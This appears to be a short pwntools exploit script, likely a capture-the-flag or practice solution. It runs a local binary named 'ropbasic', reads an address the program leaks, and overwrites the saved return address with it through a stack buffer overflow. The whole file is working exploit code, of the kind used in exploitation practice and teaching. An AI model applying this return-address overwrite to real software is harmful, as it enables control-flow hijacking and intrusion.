#!usr/bin/env python3

from pwn import *
p = process("./ropbasic")


print("~" * 30)
p.recvuntil(b"is: ")
address = p.recvuntil(b"\n").decode().strip()
address = address[2:]

payload = b"4" * 5 #for the buffer
payload += b"8" * 8 #for the rbp
print(address)
payload += p64(int(address, 16))
p.recvuntil("bytes\n")
print(payload)
p.sendline(payload)

response = ""
while 1:
	try:
		response += p.recvuntil("\n").decode()
	except:
		break

print(response)
print("~~~finishing~~~")
p.close()


